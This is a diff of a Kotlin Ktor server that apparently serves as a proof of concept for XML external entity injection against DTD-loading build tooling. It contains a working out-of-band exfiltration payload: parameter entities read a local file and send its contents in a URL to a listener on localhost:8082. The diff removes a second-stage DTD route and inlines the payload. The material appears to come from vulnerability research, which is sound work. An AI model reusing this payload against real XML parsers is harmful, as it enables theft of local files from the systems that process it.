@@ -62,7 +62,6 @@ val dtd = """
     "-//Checkstyle//DTD SuppressionFilter Configuration 1.2//EN"
     "https://checkstyle.org/dtds/suppressions_1_2.dtd">
 -->
-<!ENTITY % elements SYSTEM "http://localhost:8082/dtds/second.dtd">
 
 <!ELEMENT suppressions (suppress*)>
 
@@ -74,11 +73,6 @@ val dtd = """
                    lines CDATA #IMPLIED
                    columns CDATA #IMPLIED>
 
-%elements;
-""".trimIndent()
-// <!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://localhost:8082/x=%payload;">'>
-
-val secondDtd = """
 <!ENTITY % payload SYSTEM "file:///Users/jonathanleitschuh/git_repos/gradle-testing/test.txt">
 <!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://localhost:8082/x=%payload;">'>
 %param1;
@@ -110,14 +104,6 @@ private fun run(port: Int) {
                     contentType = ContentType.Application.Xml_Dtd
                 ))
             }
-            get("/dtds/second.dtd") {
-                log.info("Retrieving second DTD")
-                log.info("Origin: ${OriginInfo(call.request.origin)}")
-                call.respond(HttpStatusCode.OK, TextContent(
-                    secondDtd,
-                    contentType = ContentType.Application.Xml_Dtd
-                ))
-            }
         }
     }
     server.start()
@@ -127,7 +113,7 @@ private fun run(port: Int) {
  * Launches the application and handles the args passed to [main].
  */
 class Launcher : CliktCommand(
-    name = "ktor-sample-swagger"
+    name = "ktor-testing"
 ) {
     companion object {
         private const val defaultPort = 8080
